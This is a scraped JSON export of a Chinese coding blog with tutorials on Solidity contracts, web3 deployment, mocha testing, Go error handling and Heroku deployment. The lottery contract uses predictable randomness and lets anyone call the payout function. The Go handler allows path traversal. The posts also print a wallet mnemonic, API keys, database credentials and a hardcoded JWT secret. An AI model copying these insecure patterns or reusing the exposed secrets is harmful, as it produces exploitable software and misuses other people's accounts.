...&#125;","categories":[{"name":"DAPP","slug":"DAPP","permalink":"https://dreamerjonson.com/categories/DAPP/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"},{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/tags/nodejs/"}]},{"title":"以太坊DAPP[1]-博彩-构建博彩合约","slug":"solidity-60-lottery-project-contract","date":"2018-12-01T16:08:26.000Z","updated":"2018-12-02T02:12:44.238Z","comments":true,"path":"2018/12/02/solidity-60-lottery-project-contract/","link":"","permalink":"https://dreamerjonson.com/2018/12/02/solidity-60-lottery-project-contract/","excerpt":"","text":"借助于智能合约代码公开透明的特性，其在博彩方面拥有巨大的潜力。 下面的代码构建一个博彩合约 功能如下： 1、玩家入场，必须大于0.01Ether 2、裁判判断输赢、通过随机数的方式得到赢家，赢家将会得到所有的资金。然后清空玩家列表，等待玩家从新入场。 lottery.sol 123456789101112131415161718192021222324252627282930313233343536373839404142434445pragma solidity ^0.4.23;contract Lottery&#123; //管理者 address public manager; //玩家 address[] public players;//构造函数 分配裁判 constructor() public &#123; manager = msg.sender; &#125;//玩家入场 0.01Ether function enetr() public payable&#123; require(msg.value&gt;0.01 ether); players.push(msg.sender); &#125;//产生随机数 function random() private view returns(uint)&#123; return uint(keccak256(block.difficulty,now,players)); &#125;// 权限判断 modifier restricted&#123; require(msg.sender==manager); _; &#125;// 判断输赢 function pickwiner() public&#123; uint index = random() % players.length; players[index].transfer(address(this).balance); players = new address[](0); &#125;//获取玩家列表function getPlayers() public returns(address[])&#123; return players;&#125;&#125;","categories":[{"name":"DAPP","slug":"DAPP","permalink":"https://dreamerjonson.com/categories/DAPP/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity[59]-infura-deploy","slug":"solidity-59-infura-deploy","date":"2018-12-01T14:59:52.000Z","updated":"2018-12-01T15:06:33.826Z","comments":true,"path":"2018/12/01/solidity-59-infura-deploy/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/solidity-59-infura-deploy/","excerpt":"","text":"infura 在之前，我们使用了本地的ganache-cli测试网络+mocha测试部署交互合约。现在，我们需要使用到infura将合约部署到真实的区块链的网络当中。 我们都知道，如果我们本身不是一个以太坊的节点，那么我们就需要将我们的交易发送给其他的节点来挖矿确认。infura就是默认的维护了许多的节点，我们通过它就能够与以太坊进行连接。 安装模块 1npm install --save truffle-hdwallet-provider 利用infura部署合约 deploy.js: 12345678910111213141516171819202122232425 const HDWalletProvider = require('truffle-hdwallet-provider'); const Web3 = require('web3'); const &#123;interface,bytecode&#125; = require('./compile');//借助于infura提供provider,ropsten网络 const provider = new HDWalletProvider( 'type give repair twenty split notable humor sweet obey pizza click absurd', 'https://ropsten.infura.io/v3/de22b468cb7846788b4d1ae36bcc26c2' ); const web3 = new Web3(provider); const deploy = async ()=&gt;&#123; console.log(interface); const accounts = await web3.eth.getAccounts(); //console.log('Attemp to deploy contract',accounts[0]); const result = await new web3.eth.Contract(JSON.parse(interface)).deploy(&#123;data:'0x'+bytecode&#125;) .send(&#123;from:accounts[0],gas:'1000000'&#125;); //打印出部署到合约中的地址。 console.log('contract deployed to ',result.options.address); &#125; deploy(); 部署 1&gt; node deploy.js","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity[57]-test-deploy-contract","slug":"solidity-58-test-deploy-contract","date":"2018-12-01T14:37:54.000Z","updated":"2018-12-01T14:56:58.505Z","comments":true,"path":"2018/12/01/solidity-58-test-deploy-contract/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/solidity-58-test-deploy-contract/","excerpt":"","text":"测试合约部署 1234567891011121314151617181920212223242526272829const ganache = require('ganache-cli');const Web3 = require('web3');//通过提供provider得到web3实例const web3 = new Web3(ganache.provider());//得到编译后得到的二进制文件与ABI接口。const &#123;bytecode,interface&#125; = require('../compile');//导入assert判断const assert = require('assert');var helloworld;var fetchAccounts;beforeEach( async()=&gt;&#123; //得到账号 fetchAccounts = await web3.eth.getAccounts(); //部署合约斌拿到合约实例 JSON.parse(interface) 将interface转换为JSON对象。deploy函数传递要部署的二进制文件以及构造参数。 //send函数代表真正的部署，需要传递部署的账号以及gaslimit限制。 helloworld = await new web3.eth.Contract(JSON.parse(interface)).deploy(&#123;data:bytecode,arguments:['jonson']&#125;).send(&#123;from:fetchAccounts[0],gas:'1000000'&#125;);&#125;);//获取到的helloworld实例是一个js对象，helloworld.options.address代表合约部署到以太坊上的地址。因此只要存在就意味着部署成功。繁殖部署失败describe('HelloWorld',()=&gt;&#123; it('deploy contract',()=&gt;&#123; // console.log(helloworld); assert.ok(helloworld.options.address); &#125;)&#125;) 测试合约交互——调用静态方法 1234it('call static function',async ()=&gt;&#123; const message = await helloworld.methods.getName().call(); assert.equal('jonson',message);&#125;) 测试合约交互——调用动态方法 12345it('call dynamic function',async ()=&gt;&#123; await helloworld.methods.changeName('olaya').send(&#123;from:fetchAccounts[0]&#125;); const message = await helloworld.methods.getName().call(); assert.equal('olaya',message);&#125;) 完整代码 HelloWorld.js: 12345678910111213141516171819pragma solidity ^0.4.23;contract HelloWorld&#123; string public name; constructor(string _name) public &#123; name = _name; &#125; function getName() public view returns(string)&#123; return name; &#125; function changeName(string _name) public&#123; name = _name; &#125;&#125; compile.js: 12345678910111213141516const path = require('path');const fs = require('fs');const solc = require('solc');const filepath = path.resolve(__dirname,'contracts','HelloWorld.sol');console.log(filepath);const source = fs.readFileSync(filepath,\"utf8\"); console.log(source); console.log(solc.compile(source,1).contracts[':HelloWorld']);module.exports = solc.compile(source,1).contracts[':HelloWorld']; helloworld.test.js: 1234567891011121314151617181920212223242526272829303132333435363738const ganache = require('ganache-cli');const Web3 = require('web3');const web3 = new Web3(ganache.provider()); // const helloworld = require('../compile');//helloworld.bytecode helloworld.interfaceconst &#123;bytecode,interface&#125; = require('../compile');const assert = require('assert');var helloworld;var fetchAccounts;beforeEach( async()=&gt;&#123; fetchAccounts = await web3.eth.getAccounts(); helloworld = await new web3.eth.Contract(JSON.parse(interface)).deploy(&#123;data:bytecode,arguments:['jonson']&#125;).send(&#123;from:fetchAccounts[0],gas:'1000000'&#125;); console.log(fetchAccounts); //promise&#125;);describe('HelloWorld',()=&gt;&#123; it('deploy contract',()=&gt;&#123; // console.log(helloworld); assert.ok(helloworld.options.address); &#125;) it('call static function',async ()=&gt;&#123; const message = await helloworld.methods.getName().call(); assert.equal('jonson',message); &#125;) it('call dynamic function',async ()=&gt;&#123; await helloworld.methods.changeName('olaya').send(&#123;from:fetchAccounts[0]&#125;); const message = await helloworld.methods.getName().call(); assert.equal('olaya',message); &#125;)&#125;) 测试 1&gt; npm test 返回： 1234567&gt; myproject@1.0.0 test /Users/jackson/Desktop/myproject&gt; mocha HelloWorld ✓ deploy contract ✓ call static function ✓ call dynamic function (67ms) 3 passing (348ms)","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[57]-测试web3j","slug":"solidity-57-test-web3j","date":"2018-12-01T14:10:06.000Z","updated":"2018-12-03T10:53:11.438Z","comments":true,"path":"2018/12/01/solidity-57-test-web3j/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/solidity-57-test-web3j/","excerpt":"","text":"安装模块 ganache-cli 代表本地测试网络 web3j 模块与以太坊进行交互 1&gt; npm install --save ganache-cli web3 mocha 使用mocha框架测试web3j，打印出账号 pachage.json: 123&quot;scripts&quot;: &#123; &quot;test&quot;: &quot;mocha&quot; &#125;, helloworld.test.js: 12345678910111213141516const ganache = require('ganache-cli');const Web3 = require('web3');//构建web3j实例 ， provider是连接web3j与以太坊的桥梁。这里由ganache-cli提供。const web3 = new Web3(ganache.provider());const assert = require('assert');beforeEach( ()=&gt;&#123; web3.eth.getAccounts().then(fetchAccounts=&gt;&#123; console.log(fetchAccounts); &#125;);&#125;);describe('HelloWorld',()=&gt;&#123; it('deploy contract',()=&gt;&#123;&#125;)&#125;) 测试 1&gt; npm test 打印出账号 下面的10个账号是本地测试网络ganache-cli自动生成的。 12345678910[ &apos;0xa1ef752Cb11e41844898370b57d97A0E49Fe1B31&apos;, &apos;0x8D1b2f184408F3916c0d34045FFdBe175814F5d5&apos;, &apos;0x1c668849b383e87c4F6DCD6c0ee91D56187Cba13&apos;, &apos;0x68492B65b4bec8475E7112CC3Edd807cB23DAb6b&apos;, &apos;0xaF685ba6e028a592993A10c23C2E0875d95E974A&apos;, &apos;0x6226C34bf95aad9357120501f6D7651DDe925B6d&apos;, &apos;0xB31D3f8db004717d56BBc95e45d0762Dc473Ed18&apos;, &apos;0x28fFd75386de79f54cE1f9313F0F1C8f16B5Ec1e&apos;, &apos;0x2B34AD39b40D10A5D5D6d70eeAD2b9203C0858d0&apos;, &apos;0x478061329f8AfEF014a91e7A2aeAfE628D047eb2&apos; ] ES6新特性await与async await与async处理异步操作，代码更加的优雅。 123456789101112131415161718const ganache = require('ganache-cli');const Web3 = require('web3');const web3 = new Web3(ganache.provider());const assert = require('assert');beforeEach( async()=&gt;&#123; fetchAccounts = await web3.eth.getAccounts(); console.log(fetchAccounts);&#125;);describe('HelloWorld',()=&gt;&#123; it('fetchAccounts',()=&gt;&#123;&#125;)&#125;)","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[56]-solc编译智能合约","slug":"solidity-56-node-compile-contract","date":"2018-12-01T13:59:43.000Z","updated":"2018-12-04T01:40:10.764Z","comments":true,"path":"2018/12/01/solidity-56-node-compile-contract/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/solidity-56-node-compile-contract/","excerpt":"","text":"安装solc编译器 1&gt; npm install --save solc solc编译智能合约 12345678910111213141516171819202122232425262728293031323334353637383940const path = require('path');const fs = require('fs');const solc = require('solc');//获取文件路径 跨平台const filepath = path.resolve(__dirname,'contracts','HelloWorld.sol');//打印出路径 /Users/jackson/Desktop/myproject/contracts/HelloWorld.sol//console.log(filepath);//读取文件内容const source = fs.readFileSync(filepath,\"utf8\");// console.log(source);打印出文件中的内容// pragma solidity ^0.4.23;//// contract HelloWorld&#123;// string public name;////// constructor(string _name) public &#123;// name = _name;// &#125;//// function getName() public view returns(string)&#123;// return name;// &#125;// function changeName(string _name) public&#123;// name = _name;// &#125;////// &#125;//编译后是一个对象,打印出来， 1代表1个智能合约文件 //console.log(solc.compile(source,1).contracts[':HelloWorld']);module.exports = solc.compile(source,1).contracts[':HelloWorld'];","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"nodejs渐入佳境[33]-mocha测试与自动测试","slug":"node-33-test-app","date":"2018-12-01T08:58:48.000Z","updated":"2018-12-01T10:24:02.592Z","comments":true,"path":"2018/12/01/node-33-test-app/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/node-33-test-app/","excerpt":"","text":"mocha 12&gt; npm init&gt; npm install --save-dev mocha //开发者模式下有效，不会部署到服务器上 package.json 1234567891011121314&#123; &quot;name&quot;: &quot;testapplication&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;mocha **/*.test.js&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: &#123; &quot;mocha&quot;: &quot;^5.2.0&quot; &#125;&#125; 测试文件 12345678910let add = (a,b)=&gt;a+b;it(\"test add\",()=&gt;&#123; var res = add(11,22); if(res!=33)&#123; throw new Error(`Expected 33 ,but got $&#123;res&#125;`) &#125;&#125;); 测试 1&gt; npm test 返回： 1234567&gt; mocha **/*.test.js ✓ test add 1 passing (4ms) 修改并测试 12345678910let add = (a,b)=&gt;a+b;it(&quot;test add&quot;,()=&gt;&#123; var res = add(11,55); if(res!=33)&#123; throw new Error(`Expected 33 ,but got $&#123;res&#125;`) &#125;&#125;); 返回： 123456789101112131415&gt; testapplication@1.0.0 test /Users/jackson/Desktop/testApplication&gt; mocha **/*.test.js 1) test add 0 passing (4ms) 1 failing 1) test add: Error: Expected 33 ,but got 66 at Context.it (add.test.js:8:15)npm ERR! Test failed. See above for more details. 自动测试 12&gt; npm install --save-dev nodemon&gt; nodemon --exec &quot;npm test&quot; 添加到脚本中 package.json: 123456789101112131415&#123; &quot;name&quot;: &quot;testapplication&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;mocha **/*.test.js&quot;, &quot;test-watch&quot;: &quot;nodemon --exec \\&quot;npm test\\&quot;&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: &#123; &quot;mocha&quot;: &quot;^5.2.0&quot; &#125;&#125; 执行： 1&gt;npm run test-watch","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"golang语言渐入佳境[31]-错误处理","slug":"golang-31-error-handle","date":"2018-12-01T08:14:57.000Z","updated":"2019-03-02T08:33:29.335Z","comments":true,"path":"2018/12/01/golang-31-error-handle/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/golang-31-error-handle/","excerpt":"","text":"创建错误对象的两种方式 12345678910111213//1、创建error对象的方式1 err1 := errors.New(\"自己创建的错误！\") fmt.Println(err1.Error()) fmt.Println(err1) fmt.Printf(\"err1的类型：%T\\n\", err1) //*errors.errorString fmt.Println(\"-----------------\") //2、创建error对象的方式2 err2 := fmt.Errorf(\"错误的类型%d\", 10) fmt.Println(err2.Error()) fmt.Println(err2) fmt.Printf(\"err2的类型：%T\\n\", err2) //*errors.errorString fmt.Println(\"-----------------\") 错误对象的使用办法：函数多返回值 1234567891011121314151617181920212223242526package mainimport ( \"errors\" \"fmt\")func main() &#123; res , err3 := checkAge(-12) if err3 != nil &#123; fmt.Println(err3.Error()) fmt.Println(err3) &#125; else &#123; fmt.Println(res) &#125;&#125;//设计一个函数：验证年龄。如果是负数，则返回errorfunc checkAge(age int) (string, error) &#123; if age &lt; 0 &#123; err := fmt.Errorf(\"您的年龄输入是：%d ， 该数值为负数，有错误！\", age) return \"\", err &#125; else &#123; return fmt.Sprintf(\"您的年龄输入是：%d \", age), nil &#125;&#125; 自定义错误对象：实现接口 12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( \"time\" \"fmt\")//1、定义结构体，表示自定义错误的类型type MyError struct &#123; When time.Time What string&#125;//2、实现Error()方法func (e MyError) Error() string &#123; return fmt.Sprintf(\"%v : %v\", e.When, e.What)&#125;//3、定义函数，返回error对象。该函数求矩形面积func getArea(width, length float64) (float64, error) &#123; errorInfo := \"\" if width &lt; 0 &amp;&amp; length &lt; 0 &#123; errorInfo = fmt.Sprintf(\"长度：%v, 宽度：%v ， 均为负数\", length, width) &#125; else if length &lt; 0 &#123; errorInfo = fmt.Sprintf(\"长度：%v, 出现负数 \", length) &#125; else if width &lt; 0 &#123; errorInfo = fmt.Sprintf(\"宽度：%v ， 出现负数\", width) &#125; if errorInfo != \"\" &#123; return 0, MyError&#123;time.Now(), errorInfo&#125; &#125; else &#123; return width * length, nil &#125;&#125;func main() &#123; res , err := getArea(-4, -5) if err != nil &#123; fmt.Printf(err.Error()) &#125; else &#123; fmt.Println(\"面积为：\" , res) &#125;&#125; 统一资源错误处理 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package mainimport ( \"net/http\" \"log\" \"os\" \"io/ioutil\")//当用户访问/list之后，进行资源处理func HandleFileList(writer http.ResponseWriter, request *http.Request) error &#123; path := request.URL.Path[len(\"/list/\"):] file, err := os.Open(path) if err != nil &#123; return err &#125; defer file.Close() all, err := ioutil.ReadAll(file) if err != nil &#123; return err &#125; writer.Write(all) return nil&#125;type appHandler func(writer http.ResponseWriter, request *http.Request) error//错误包装器，统一错误处理func errWrapper( handler appHandler) func( http.ResponseWriter, *http.Request) &#123; //也是一个handle返回函数，只是错误处理之后，函数式编程 return func(writer http.ResponseWriter, request *http.Request) &#123; err := handler(writer, request) if err != nil &#123; log.Printf(\"Error occurred \"+ \"handling request: %s\", err.Error()) // system error code := http.StatusOK switch &#123; case os.IsNotExist(err): code = http.StatusNotFound case os.IsPermission(err): code = http.StatusForbidden default: code = http.StatusInternalServerError &#125; http.Error(writer, http.StatusText(code), code) &#125; &#125;&#125;//web服务器func main() &#123; http.HandleFunc(\"/list/\", errWrapper(HandleFileList)) err := http.ListenAndServe(\":8888\", nil) if err != nil &#123; panic(err) &#125;&#125; recover的用例 12345678910111213141516171819202122232425262728293031323334func tryRecover() &#123; defer func() &#123; r := recover() if r == nil &#123; fmt.Println(\"Nothing to recover. \" + \"Please try uncomment errors \" + \"below.\") return &#125; if err, ok := r.(error); ok &#123; fmt.Println(\"Error occurred:\", err) &#125; else &#123; panic(fmt.Sprintf( \"I don't know what to do: %v\", r)) &#125; &#125;() // Uncomment each block to see different panic // scenarios. // Normal error //panic(errors.New(\"this is an error\")) // Division by zero //b := 0 //a := 5 / b //fmt.Println(a) // Causes re-panic //panic(123)&#125;func main() &#123; tryRecover()&#125; 统一资源错误处理2 web.go 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package viperimport ( \"net/http\" \"log\" \"os\")type appHandler func(writer http.ResponseWriter, request *http.Request) errorfunc errWrapper( handler appHandler) func( http.ResponseWriter, *http.Request) &#123; return func(writer http.ResponseWriter, request *http.Request) &#123; // panic defer func() &#123; if r := recover(); r != nil &#123; log.Printf(\"Panic: %v\", r) http.Error(writer, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError) &#125; &#125;() err := handler(writer, request) if err != nil &#123; log.Printf(\"Error occurred \"+ \"handling request: %s\", err.Error()) // user error if userErr, ok := err.(userError); ok &#123; http.Error(writer, userErr.Message(), http.StatusBadRequest) return &#125; // system error code := http.StatusOK switch &#123; case os.IsNotExist(err): code = http.StatusNotFound case os.IsPermission(err): code = http.StatusForbidden default: code = http.StatusInternalServerError &#125; http.Error(writer, http.StatusText(code), code) &#125; &#125;&#125;type userError interface &#123; error Message() string&#125;func main() &#123; http.HandleFunc(\"/\", errWrapper(HandleFileList)) err := http.ListenAndServe(\":8888\", nil) if err != nil &#123; panic(err) &#125;&#125; handle.go 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package viperimport ( \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"strings\")const prefix = \"/list/\"type usertestError stringfunc (e usertestError) Error() string &#123; return e.Message()&#125;func (e usertestError) Message() string &#123; return string(e)&#125;func HandleFileList(writer http.ResponseWriter, request *http.Request) error &#123; fmt.Println() if strings.Index( request.URL.Path, prefix) != 0 &#123; return usertestError( fmt.Sprintf(\"path %s must start \"+ \"with %s\", request.URL.Path, prefix)) &#125; path := request.URL.Path[len(prefix):] file, err := os.Open(path) if err != nil &#123; return err &#125; defer file.Close() all, err := ioutil.ReadAll(file) if err != nil &#123; return err &#125; writer.Write(all) return nil&#125; wraperror_test.go 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package viperimport ( \"errors\" \"fmt\" \"io/ioutil\" \"net/http\" \"net/http/httptest\" \"os\" \"strings\" \"testing\")func errPanic(_ http.ResponseWriter, _ *http.Request) error &#123; panic(123)&#125;type testingUserError stringfunc (e testingUserError) Error() string &#123; return e.Message()&#125;func (e testingUserError) Message() string &#123; return string(e)&#125;func errUserError(_ http.ResponseWriter, _ *http.Request) error &#123; return testingUserError(\"user error\")&#125;func errNotFound(_ http.ResponseWriter, _ *http.Request) error &#123; return os.ErrNotExist&#125;func errNoPermission(_ http.ResponseWriter, _ *http.Request) error &#123; return os.ErrPermission&#125;func errUnknown(_ http.ResponseWriter, _ *http.Request) error &#123; return errors.New(\"unknown error\")&#125;func noError(writer http.ResponseWriter, _ *http.Request) error &#123; fmt.Fprintln(writer, \"no error\") return nil&#125;var tests = []struct &#123; h appHandler code int message string&#125;&#123; &#123;errPanic, 500, \"Internal Server Error\"&#125;, &#123;errUserError, 400, \"user error\"&#125;, &#123;errNotFound, 404, \"Not Found\"&#125;, &#123;errNoPermission, 403, \"Forbidden\"&#125;, &#123;errUnknown, 500, \"Internal Server Error\"&#125;, &#123;noError, 200, \"no error\"&#125;,&#125;func TestErrWrapper(t *testing.T) &#123; for _, tt := range tests &#123; f := errWrapper(tt.h) response := httptest.NewRecorder() request := httptest.NewRequest( http.MethodGet, \"http://www.imooc.com\", nil) f(response, request) verifyResponse(response.Result(), tt.code, tt.message, t) &#125;&#125;func TestErrWrapperInServer(t *testing.T) &#123; for _, tt := range tests &#123; f := errWrapper(tt.h) server := httptest.NewServer( http.HandlerFunc(f)) resp, _ := http.Get(server.URL) verifyResponse( resp, tt.code, tt.message, t) &#125;&#125;func verifyResponse(resp *http.Response, expectedCode int, expectedMsg string, t *testing.T) &#123; b, _ := ioutil.ReadAll(resp.Body) body := strings.Trim(string(b), \"\\n\") if resp.StatusCode != expectedCode || body != expectedMsg &#123; t.Errorf(\"expect (%d, %s); \"+ \"got (%d, %s)\", expectedCode, expectedMsg, resp.StatusCode, body) &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"nodejs渐入佳境[32]-mongodb+express+auth middleware部署到heroku","slug":"node-32-auto-heroku","date":"2018-12-01T07:56:28.000Z","updated":"2018-12-01T10:23:27.850Z","comments":true,"path":"2018/12/01/node-32-auto-heroku/","link":"","permalink":"https://dreamerjonson.com/2018/12/01/node-32-auto-heroku/","excerpt":"","text":"package.json 123456789101112131415161718192021222324252627282930313233&#123; &quot;name&quot;: &quot;node-todo-api&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;node server/server.js&quot;, &quot;test&quot;: &quot;export NODE_ENV=test || SET NODE_ENV=test &amp;&amp; mocha server/**/*.test.js&quot;, &quot;test-watch&quot;: &quot;nodemon --exec &apos;npm test&apos;&quot; &#125;, &quot;engines&quot;: &#123; &quot;node&quot;: &quot;6.2.2&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: &#123; &quot;bcryptjs&quot;: &quot;^2.3.0&quot;, &quot;body-parser&quot;: &quot;^1.15.2&quot;, &quot;crypto-js&quot;: &quot;^3.1.6&quot;, &quot;express&quot;: &quot;^4.14.0&quot;, &quot;jsonwebtoken&quot;: &quot;^7.1.9&quot;, &quot;lodash&quot;: &quot;^4.15.0&quot;, &quot;mongodb&quot;: &quot;^2.2.5&quot;, &quot;mongoose&quot;: &quot;^4.5.9&quot;, &quot;validator&quot;: &quot;^5.6.0&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;expect&quot;: &quot;^1.20.2&quot;, &quot;mocha&quot;: &quot;^3.0.2&quot;, &quot;nodemon&quot;: &quot;^1.10.2&quot;, &quot;supertest&quot;: &quot;^2.0.0&quot; &#125;&#125; git 1234.gitignore里面的文件不会提交git initgit add .git commit -m &quot;fitst commit&quot; heroku 安装heroku-cli 略… 1234heroku login // 登陆账号密码heroku create //创建分支git push heroku master //提交到heroku管理的远程分支hexoru open //打开网址 得到：https://mighty-plateau-79112.herokuapp.com studio 3T 连接mongoDB heruku config 123jacksondeMacBook-Pro:compaign jackson$ heroku config=== mighty-plateau-79112 Config VarsMONGODB_URI: mongodb://heroku_10kx7394:ij2q2p51lgsh0grsp2dq56mgu2@ds211694.mlab.com:11694/heroku_10kx7394 添加参数，连接远程mongoDB数据库 12345server: ds211694.mlab.comport: 11694authentication DB: heroku_10kx7394Username: heroku_10kx7394password: ij2q2p51lgsh0grsp2dq56mgu2 测试 12345678910111213141516171819202122232425262728293031323334353637381、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;https://mighty-plateau-79112.herokuapp.com/users 保存userBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian08@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5c00a66978dd038d39dc4b89&quot;, &quot;email&quot;: &quot;zhuimengshaonian08@gmail.com&quot;&#125;header:x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr84、 选择patch 输入 &gt;https://mighty-plateau-79112.herokuapp.com/todos/5c00a66978dd038d39dc4b89 准备修改Body中填入：&#123; &quot;text&quot;: &quot;zhuimengshaonian09@gmail.com&quot;,&#125;header附带返回：x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr8返回：&#123; &quot;completed&quot;: false, &quot;completedAt&quot;: null, &quot;_id&quot;: &quot;5c00a66978dd038d39dc4b89&quot;, &quot;text&quot;: &quot;zhuimengshaonian09@gmail.com&quot;, &quot;_creator&quot;: &quot;5c00a58c78dd038d39dc4b87&quot;, &quot;__v&quot;: 0&#125; ##源代码var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');const jwt = require('jsonwebtoken');const bcrypt = require('bcryptjs');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;, _creator: &#123; type: mongoose.Schema.Types.ObjectId, required: true &#125;&#125;);var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;;UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString(); user.tokens = user.tokens.concat([&#123;access,token&#125;]); return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;UserSchema.methods.removeToken = function (token) &#123; var user = this; return user.update(&#123; $pull: &#123; tokens: &#123;token&#125; &#125; &#125;);&#125;;UserSchema.statics.findByToken = function (token) &#123; var User = this; var decoded; try &#123; decoded = jwt.verify(token, 'abc123'); &#125; catch (e) &#123; return Promise.reject(); &#125; return User.findOne(&#123; '_id': decoded._id, 'tokens.token': token, 'tokens.access': 'auth' 